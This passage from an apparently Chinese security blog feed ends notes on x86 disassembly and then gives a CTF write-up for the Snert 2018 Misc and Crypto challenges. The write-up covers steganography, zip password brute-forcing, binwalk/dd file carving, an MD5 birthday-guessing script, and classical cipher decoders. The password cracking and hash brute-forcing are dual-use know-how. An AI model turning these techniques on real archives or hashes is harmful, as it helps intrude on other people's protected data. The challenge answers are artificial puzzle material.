C语言主函数和偏移</h3><p>一个标准C程序的主函数有两个参数，形式如下：<br><code>int main(int argc, char** argv)</code><br>参数argc和argv在运行时决定。其中，参数argc是一个整数，说明了命令行中参数的个数，包括程序名字本身：参数argv是一个字符串数据指针，指向了所有的命令行参数。</p><p><img src="https://i.loli.net/2018/07/19/5b501e7e24a3e.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501e7e38f9b.jpg" alt="mark"></p><h3 id="12-更多信息：Intel×86-Architecture-Manual"><a href="#12-更多信息：Intel×86-Architecture-Manual" class="headerlink" title="12. 更多信息：Intel×86 Architecture Manual"></a>12. 更多信息：Intel×86 Architecture Manual</h3><p><img src="https://i.loli.net/2018/07/19/5b501e7e50e23.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501e7e66ddb.jpg" alt="mark"></p><p>From <a href="https://kabeor.github.io/第4章 x86反汇编速成班/">https://kabeor.github.io/第4章 x86反汇编速成班/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第4章-x86反汇编速成班&quot;&gt;&lt;a href=&quot;#第4章-x86反汇编速成班&quot; class=&quot;headerlink&quot; title=&quot;第4章 x86反汇编速成班&quot;&gt;&lt;/a&gt;第4章 x86反汇编速成班&lt;/h1&gt;&lt;h2 id=&quot;4x1-抽象层次&quot;&gt;&lt;a href=&quot;#4
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Snert-2018春季淘汰赛Misc,Crypto WriteUp</title>
    <link href="https://kabeor.github.io/Snert-2018%E6%98%A5%E5%AD%A3%E6%B7%98%E6%B1%B0%E8%B5%9BMisc,Crypto%20WriteUp/"/>
    <id>https://kabeor.github.io/Snert-2018春季淘汰赛Misc,Crypto WriteUp/</id>
    <published>2018-03-18T14:00:17.379Z</published>
    <updated>2018-07-16T10:53:40.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc100-black"><a href="#Misc100-black" class="headerlink" title="Misc100 black"></a>Misc100 black</h1><p>给了张图，估计隐写<br><img src="https://i.loli.net/2018/07/16/5b4c78f66cea7.jpg" alt="mark"></p><p>掏出神器StegSolve<br><img src="https://i.loli.net/2018/07/16/5b4c78f6d153e.jpg" alt="mark"><br>点下面的箭头到Random color就看见了<br><img src="https://i.loli.net/2018/07/16/5b4c78f7b9d20.jpg" alt="mark"></p><h1 id="Misc200-我在哪"><a href="#Misc200-我在哪" class="headerlink" title="Misc200 我在哪"></a>Misc200 我在哪</h1><p><img src="https://i.loli.net/2018/07/16/5b4c78f7d03f8.jpg" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12343254634532412342423423412435645756879076845643521343254365756f2423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756l24234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756a024234234124356457568790768456435213432543657561343254365756242134325436575624213432543657562421343254365756242g2423423412435645756879076845643521343254365756242342341243564575687907684564352134325436575624234234124356457568790768456435213432543657562423423412435645756879076845643521343254365756&#123;352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242f35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242u3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242c3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242k3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242756242352134325436575624235213756242352134325436575624235213756242352134325436575624235213756242352134325436575624235213756242352134325436575624235213_1343254365756242135213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242t352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242h352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242i35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242s35213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242&#125;3521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624235213432543657562423521343254365756242352134325436575624213432543657562421343254365756242</span><br></pre></td></tr></table></figure><p>给了一大堆，但是我从里面看见了f等字母，不想费眼睛，新建word，把数字全部替换为空即可<br><img src="https://i.loli.net/2018/07/16/5b4c78f7e3df0.jpg" alt="mark"></p><blockquote><p>官方wp<br>用的是脚本</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str=<span class="string">"xxxxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">    <span class="keyword">if</span> i.isdigit():</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure><h1 id="Misc300-某人的猫"><a href="#Misc300-某人的猫" class="headerlink" title="Misc300 某人的猫"></a>Misc300 某人的猫</h1><p><img src="https://i.loli.net/2018/07/16/5b4c78f812933.jpg" alt="mark"></p><p>给了个压缩包，winhex看了，并不是伪加密，于是掏出神器Ziperello,设定1到8位纯数字爆破，五秒真男人后就成功了</p><p><img src="https://i.loli.net/2018/07/16/5b4c78f83d9e2.jpg" alt="mark"></p><p>打开txt看看</p><p><img src="https://i.loli.net/2018/07/16/5b4c78f864b5e.jpg" alt="mark"><br>非常的长<br>没有base64的特点，想到了16进制转字符串，试试</p><p><img src="https://i.loli.net/2018/07/16/5b4c78f887a84.jpg" alt="mark"><br>乱码了，不过看见了PNG，那肯定是转图片咯<br>使用16进制转图片的软件<br><img src="https://i.loli.net/2018/07/16/5b4c79177503d.jpg" alt="mark"><br>得到一张照片<br><img src="https://i.loli.net/2018/07/16/5b4c79178a87b.jpg" alt="mark"><br>扫一扫<br>得到<br><img src="https://i.loli.net/2018/07/16/5b4c79179e38d.jpg" alt="mark"><br>没什么头绪，放进kali中binwalk一下，中奖了<br><img src="https://i.loli.net/2018/07/16/5b4c7917c528e.jpg" alt="mark"><br>五张，第一张就是那个二维码，其他的用dd命令分离<br><code>dd if=1.jpg of=2.jpg skip=12280 bs=1</code><br>这里if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过12280个块后再开始复制，bs设置每次读写块的大小为1字节.</p><p><img src="https://i.loli.net/2018/07/16/5b4c7917e9c35.jpg" alt="mark"><br>最后的flag</p><blockquote><p>官方wp</p><p>千禧年:2000年<br>md5:2adf764239cce9d9052b0670bbbbb455<br>纯考写脚本<br>思路就是md5碰撞去匹配生日，但是考点在如何从12*31个md5中去找到那个被修改了一位之前的<br>md5<br>py中有现成的库difflib 去比较两个字符串的相似程度，所以找出其中相似值最大的就好了</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> difflib</span><br><span class="line">days=[]</span><br><span class="line"><span class="comment"># 生成生日日期</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;=<span class="number">9</span>:</span><br><span class="line">        mounth=<span class="string">'0'</span>+str(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mounth=str(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> j &lt;=<span class="number">9</span>:</span><br><span class="line">            day=<span class="string">'0'</span>+str(j)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            day=str(j)</span><br><span class="line">        birth=<span class="string">'1997'</span>+mounth+day</span><br><span class="line">        days.append(birth)</span><br><span class="line"></span><br><span class="line">code=<span class="string">'2adf764239cce9d9052b0670bbbbb455'</span></span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line">ratios = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#碰撞md5，并计算相似值，以字典的形式储存最后读取出相似值最高的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> day <span class="keyword">in</span> days:</span><br><span class="line">    md5 = hashlib.md5(day.encode(<span class="string">'utf‐8'</span>)).hexdigest()</span><br><span class="line">    seq = difflib.SequenceMatcher(<span class="keyword">None</span>,md5,code)</span><br><span class="line">    ratio = seq.ratio()</span><br><span class="line">    ratios.append(ratio)</span><br><span class="line">    result[ratio]=day</span><br><span class="line">    <span class="keyword">print</span> ratio,day</span><br><span class="line"></span><br><span class="line">tmax = max(ratios)</span><br><span class="line"><span class="keyword">print</span> tmax</span><br><span class="line"><span class="keyword">print</span> result[tmax]</span><br></pre></td></tr></table></figure><h1 id="Misc200-flag去哪了"><a href="#Misc200-flag去哪了" class="headerlink" title="Misc200 flag去哪了"></a>Misc200 flag去哪了</h1><p>又给了一张图(这张图不会显示)<br><img src="https://i.loli.net/2018/07/16/5b4c791809265.jpg" alt="mark"><br>截图为<br><img src="https://i.loli.net/2018/07/16/5b4c79181c8b2.jpg" alt="mark"><br>这回缺了点什么<br>放进linux不识别，应该是修改了16进制的像素位，所以用winhex看看<br><img src="https://i.loli.net/2018/07/16/5b4c791831ffc.jpg" alt="mark"></p><p>对于png文件，其第二行第六七列是高度位，改这一位即可，修改时的数值应该从十进制转为16进制<br><img src="https://i.loli.net/2018/07/16/5b4c7918462ea.jpg" alt="mark"><br>保存后查看，也只能截图了<br><img src="https://i.loli.net/2018/07/16/5b4c792fdcd9e.jpg" alt="mark"><br>那个o是小写。。。</p><h1 id="Crypto100-TAT"><a href="#Crypto100-TAT" class="headerlink" title="Crypto100 TAT"></a>Crypto100 TAT</h1><p><img src="https://i.loli.net/2018/07/16/5b4c792ff0322.jpg" alt="mark"><br>对于这道题我只能说，别百度了，Google吧，颜文字密码，aaencode解密即可<br><img src="https://i.loli.net/2018/07/16/5b4c79301014e.jpg" alt="mark"></p><h1 id="Crypto200-仿射密码"><a href="#Crypto200-仿射密码" class="headerlink" title="Crypto200 仿射密码"></a>Crypto200 仿射密码</h1><p><img src="https://i.loli.net/2018/07/16/5b4c793027d37.jpg" alt="mark"></p><p>加法密码和乘法密码结合就构成仿射密码，仿射密码的加密和解密算法是：C= Ek(m)=(k1m+k2) mod n<br>M= Dk(c)=k3(c- k2) mod n（其中（k3 ×k1）mod26 = 1）<br>仿射密码具有可逆性的条件是gcd(k1, n)=1。当k1=1时，仿射密码变为加法密码，当k2=0时，仿射密码变为乘法密码。<br>仿射密码中的密钥空间的大小为nφ(n)，当n为26字母，φ(n)=12，因此仿射密码的密钥空间为12×26 = 312。</p><p>让解密，c++写个程序</p><p><img src="https://i.loli.net/2018/07/16/5b4c793066476.jpg" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">char s[100];</span><br><span class="line">int num[100];</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">while (std::cin &gt;&gt; s)</span><br><span class="line">&#123;</span><br><span class="line">int len = (int)strlen(s);</span><br><span class="line">for (int i = 0; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">num[i] = s[i] - &apos;a&apos; + 26;</span><br><span class="line">while ((num[i] - 7) % 11)</span><br><span class="line">&#123;</span><br><span class="line">num[i] += 26;</span><br><span class="line">&#125;</span><br><span class="line">s[i] = (num[i] - 7) / 11 + &apos;a&apos;;</span><br><span class="line">printf(&quot;%c&quot;, s[i]);</span><br><span class="line">&#125;</span><br><span class="line">putchar(&apos;\n&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/16/5b4c793081d4e.jpg" alt="mark"></p><h1 id="Crypto200-animals"><a href="#Crypto200-animals" class="headerlink" title="Crypto200 animals?"></a>Crypto200 animals?</h1><p><img src="https://i.loli.net/2018/07/16/5b4c7930b0019.jpg" alt="mark"><br>给了一长串，最后有===，是个base64，于是只能一遍一遍去解了，<br>最后留下一行<br><img src="https://i.loli.net/2018/07/16/5b4c7930c20c0.jpg" alt="mark"></p><p>倒过来</p><pre><code>what kind of animal cry wangwang</code></pre><p>会汪汪的只有dog</p><p>所以    flag{dog}</p><blockquote><p>官方wp<br>n次base64</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str=<span class="string">'xxx'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=base64.b64decode(str)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> <span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><h1 id="Crypto300-真正的粉丝0-0"><a href="#Crypto300-真正的粉丝0-0" class="headerlink" title="Crypto300 真正的粉丝0_0"></a>Crypto300 真正的粉丝0_0</h1><p><img src="https://i.loli.net/2018/07/16/5b4c7930d7308.jpg" alt="mark"></p><p>并不知道这是什么梗，还好I have a girlfriend</p><p>所以不知道为什么会有 89 64<br>也不知道为什么最后  flag{tooyoungtoosimple}</p><blockquote><p>官方wp</p></blockquote><p>格朗普雷密码,特点是用一个单词或者句子作为棋盘首行，包含26个英文字母，然后用坐标<br>表示字母<br>提示给了为什么没有9和句子中字母的个数提示，一共64个字母，是8*8 的棋盘，所以没有9<br>从上到下把字母放入棋盘</p><pre><code>  1 2 3 4 5 6 7 81 t h e q u i c k 2 b r o w n f o x3 j u m p s o v e4 r t h e l a z y5 d o g a n d a n6 a i v e g u y w7 a n t t o g e t8 a f l a g l o l</code></pre><p>对应 11 27 87 67 52 66 55 85 73 87 27 35 16 33 34 45 77</p><h2 id="完结"><a href="#完结" class="headerlink" title="完结"></a>完结</h2><p>From <a href="https://kabeor.github.io/Snert-2018春季淘汰赛Misc,Crypto WriteUp/">https://kabeor.github.io/Snert-2018春季淘汰赛Misc,Crypto WriteUp/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Misc100-black&quot;&gt;&lt;a href=&quot;#Misc100-black&quot; class=&quot;headerlink&quot; title=&quot;Misc100 black&quot;&gt;&lt;/a&gt;Misc100 black&lt;/h1&gt;&lt;p&gt;给了张图，估计隐写&lt;br&gt;&lt;img src=&quot;htt
      
    
    </summary>
    
      <category term="密码学和杂项" scheme="https://kabeor.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="密码学" scheme="https://kabeor.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="杂项" scheme="https://kabeor.github.io/tags/%E6%9D%82%E9%A1%B9/"/>
    
      <category term="Misc" scheme="https://kabeor.github.io/tags/Misc/"/>
    
      <category term="Crypto" scheme="https://kabeor.github.io/tags/Crypto/"/>
    
  </entry>
  
</feed>
